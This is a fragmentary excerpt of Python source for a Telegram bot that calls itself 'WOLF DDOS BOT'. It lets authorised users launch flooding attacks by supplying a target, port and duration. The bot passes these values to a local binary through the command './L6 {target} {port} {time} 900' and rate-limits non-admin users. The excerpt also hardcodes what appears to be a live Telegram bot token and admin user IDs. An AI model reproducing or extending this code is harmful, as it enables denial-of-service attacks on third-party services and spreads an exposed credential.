...
bot = telebot.TeleBot('7979037758:AAF3O-7rMnCgleGG8HOukhfbXxN4nZP3lF4')

# Admin user IDs
admin_id = ["787517301", "859818729"]
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
                response = "❕𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝗽𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 120 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❕"
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./L6 {target} {port} {time} 900"
...
def welcome_start(message):
    ...
    response = f"🔆 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗪𝗢𝗟𝗙 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 🔆"
    bot.reply_to(message, response)
